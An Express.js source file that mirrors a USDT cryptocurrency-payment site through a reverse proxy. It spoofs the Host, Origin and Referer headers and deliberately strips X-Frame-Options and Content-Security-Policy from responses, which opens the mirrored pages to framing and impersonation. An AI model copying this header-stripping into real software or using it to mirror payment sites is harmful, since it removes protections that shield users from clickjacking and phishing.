const express = require("express");
const { createProxyMiddleware } = require("http-proxy-middleware");

const app = express();

const TARGET = "https://www.usdt.love";

const proxyPaths = [
  "/address_confirm",
  "/black_u",
  "/merchant_dashboard",
  "/mining",
  "/mobile_topup",
  "/osint",
  "/tg_topup",
  "/tihuo",
  "/trx_energy",
  "/usdt_pay",
  "/sms",
  "/api",
  "/index/index/notify",
  "/index/index/confirm",
  "/index.php",
  "/assets",
  "/uploads"
];

const proxy = createProxyMiddleware({
  target: TARGET,
  changeOrigin: true,
  secure: true,
  ws: true,
  followRedirects: true,
  xfwd: true,

  on: {
    proxyReq: (proxyReq, req) => {
      proxyReq.setHeader("Host", "www.usdt.love");
      proxyReq.setHeader("Origin", TARGET);
      proxyReq.setHeader("Referer", TARGET + "/");

      console.log(
        `[${new Date().toISOString()}] ${req.method} ${req.originalUrl}`
      );
    },

    proxyRes: (proxyRes) => {
      delete proxyRes.headers["x-frame-options"];
      delete proxyRes.headers["content-security-policy"];
      delete proxyRes.headers["content-security-policy-report-only"];
    },

    error: (err, req, res) => {
      console.error(err);

      if (!res.headersSent) {
        res.writeHead(500, {
          "Content-Type": "text/plain"
        });
      }

      res.end("Proxy Error");
    }
  }
});

proxyPaths.forEach((path) => {
  app.use(path, proxy);
});

app.get("/", (req, res) => {
  res.redirect("/usdt_pay/");
});

app.use("/", proxy);

const PORT = process.env.PORT || 3000;

app.listen(PORT, () => {
  console.log(`Proxy server running on port ${PORT}`);
});
